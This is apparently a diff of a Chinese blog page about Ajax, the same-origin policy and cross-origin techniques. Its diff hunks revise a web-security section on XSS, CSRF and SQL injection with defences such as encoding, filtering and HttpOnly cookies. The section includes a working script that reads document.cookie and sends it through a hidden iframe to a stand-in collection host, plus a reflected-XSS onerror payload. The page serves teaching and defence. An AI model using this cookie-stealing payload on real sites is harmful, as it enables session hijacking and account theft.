@@ -17,7 +17,7 @@
 <meta property="og:url" content="http://lx15.github.io/2017/02/21/Ajax_Json_Jsonp/index.html">
 <meta property="og:site_name" content="Lx15的博客">
 <meta property="og:description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
-<meta property="og:updated_time" content="2017-04-15T12:22:16.000Z">
+<meta property="og:updated_time" content="2017-05-12T01:27:11.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="原生Ajax使用实现、同源策略及CORS等跨域方案">
 <meta name="twitter:description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
@@ -158,17 +158,39 @@
 <p>但是在实际测试时 当前后端不分离的情况下这种非简单请求是可以跨域的，但是在前后端分离的情况下，这种非简单请求是不可以跨域的，这是为什么呢？ 我还不清楚，你若是知道，可以留言告诉我么？</p>
 <p> 除了上面的方法之外，还有像iFrame ，document.cookie跨二级域名，window.name 等方法，对于Iframe 我并没有实际使用过，等以后再总结吧。</p>
 </blockquote>
-<h2 id="Web-安全及防护"><a href="#Web-安全及防护" class="headerlink" title="Web 安全及防护"></a>Web 安全及防护</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS 全称“跨站脚本”，是注入攻击的一种。通过XSS攻击，设置利用js脚本调用document.cookie 以窃取Cookie 信息，盗走用户的session_id ,然后使用此会话id伪装成用户，达到攻击的目的。这就是会话劫持（Session Hijack）</p>
+<h2 id="Web-安全及防护"><a href="#Web-安全及防护" class="headerlink" title="Web 安全及防护"></a>Web 安全及防护</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS 全称“跨站脚本攻击”，是注入攻击的一种。原理是攻击者通过“HTML注入”篡改了网页，插入了恶意的脚本，在用户浏览网页时，控制了用户浏览器的一种攻击方式。主要包括反射型XSS 和存储型XSS。 </p>
+<p>反射型XSS 是指xss代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。 如<br><code>http://ip:port?&lt;img src=&quot;null&quot; onerror=&quot;alert(2)&quot;&gt;</code> 这种情况等。</p>
+<p>存储型XSS 是指恶意的脚本保存在服务器端。 </p>
+<p>通过XSS攻击，也可以设置利用js脚本调用document.cookie 以窃取Cookie 信息，盗走用户的session_id ,然后使用此会话id伪装成用户，以达到攻击的效果。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">	<span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">	<span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">	<span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">	<span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">	<span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">	hideFrame.height = <span class="number">0</span>;</div><div class="line">	hideFrame.width = <span class="number">0</span>;</div><div class="line">	hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">	hideFrame.src = xssURI;</div><div class="line">	<span class="comment">// 开工</span></div><div class="line">	<span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure>
 <p>防范措施：     </p>
-<p>如果网站不需要在浏览器端对cookie 进行操作，可以在Set-Cookie末尾加上HttpOnly来防止javascript代码直接获取cookie。</p>
-<p>代码里对用户输入的地方和变量都需要仔细检查长度和对“&lt;”,”&gt;”,”.”,”‘“等字符先做过滤。 </p>
-<p>避免直接在cookie中泄露用户隐私，例如email、passwd等。</p>
-<p>可以通过使Cookie和系统ip绑定来降低cookie泄露的风险。这样攻击者得到的cookie没有实际价值，不可能拿来重放。</p>
-<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF:”跨站点请求伪造”攻击 是值攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
+<ol>
+<li><p>将URL 进行编码。 将’&gt;’编码成’&amp;gt’等。 也可以使用encodeURI 和encodeURIcomponent。也可以使用<a href="https://github.com/mathiasbynens/he" target="_blank" rel="external">he</a>这个模块。</p>
+<blockquote>
+<p>encodeURI 和encodeURIcomponent的区别</p>
+</blockquote>
+</li>
+</ol>
+<p>　- encodeURI方法不会对下列字符编码  ASCII字母、数字、~!@#$&amp;*()=:/,;?+’</p>
+<p>　- encodeURIComponent方法不会对下列字符编码 ASCII字母、数字、~!*()’<br>所以encodeURIComponent比encodeURI编码的范围更大。实际例子来说，encodeURIComponent会把 http://  编码成  http%3A%2F%2F 而encodeURI却不会。</p>
+<ul>
+<li><p>如果你需要编码整个URL，然后需要使用这个URL，那么用encodeURI</p>
+</li>
+<li><p>当你需要编码URL中的参数的时候，那么encodeURIComponent是最好方法。</p>
+</li>
+</ul>
+<ol>
+<li><p>过滤： 移除用户上传的DOM 属性，如onerror,移除用户上传的style节点、script节点、Iframe节点、frame节点</p>
+</li>
+<li><p>校正： 避免直接对HTML Entity 进行解码，使用DOM parse 转换。校正不配对的DOM标签。 这种情况可以避免<code>DOM Based XSS</code>。这种攻击可以是使用了href过早的闭合然后添加onclick 属性造成DOM节点的修改进行攻击。</p>
+</li>
+<li><p>httpOnly: 这只能解决xss 后的cookie 劫持攻击 。如果网站不需要在浏览器端对cookie 进行操作，可以在Set-Cookie末尾加上HttpOnly来防止javascript代码直接获取cookie。</p>
+</li>
+</ol>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF:”跨站点请求伪造”攻击 是指攻击者通过设置好的陷阱，对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。即一些恶意的对服务器的请求是攻击者伪造的。CSRF 可以通过XSS 实现。</p>
 <p>案例情景：</p>
-<pre><code>1. 用户A认真了用户A身份，在网站上留下了Cookie           
-2. 另一个人 留下评论&lt;img src=&quot;http://tongyige.com/.....&quot;&gt;          
+<pre><code>1. 用户A认证了用户A身份，在网站上留下了Cookie           
+2. 另一个人 留下评论&lt;img src=&quot;http://tongyige.com/.....&quot; onclick=&quot;&quot;&gt;          
 3. 用户A触发陷阱。。。            
 </code></pre><h3 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h3><p>  sql注入是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
 <h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
@@ -262,7 +284,7 @@
 		<ul class="clearfix">
 		
 			
-				<li><a href="/tags/js/" title="js">js<sup>33</sup></a></li>
+				<li><a href="/tags/js/" title="js">js<sup>35</sup></a></li>
 			
 		
 			
